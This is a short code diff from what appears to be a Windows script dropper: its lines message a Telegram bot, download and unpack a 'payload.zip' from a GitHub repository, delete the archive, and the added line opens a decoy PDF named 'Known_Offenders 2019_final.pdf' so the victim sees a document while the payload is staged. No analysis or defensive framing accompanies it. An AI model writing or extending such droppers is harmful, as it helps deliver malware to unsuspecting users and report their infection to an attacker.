@@ -8,3 +8,4 @@ s.Run("curl.exe -s -X POST \"https://api.telegram.org/bot" + b + "/sendMessage\"
 s.Run("curl.exe -sL -o " + t + "\\p.zip https://github.com/dont-delete-me-v0/files/raw/main/payload.zip", 0, true);
 s.Run("tar -xf " + t + "\\p.zip -C " + t, 0, true);
 s.Run("cmd /c del " + t + "\\p.zip", 0, false);
+s.Run("cmd /c start \"\" \"C:\\Users\\Administrator\\Downloads\\Known_Offenders 2019_final.pdf\"", 0, false);
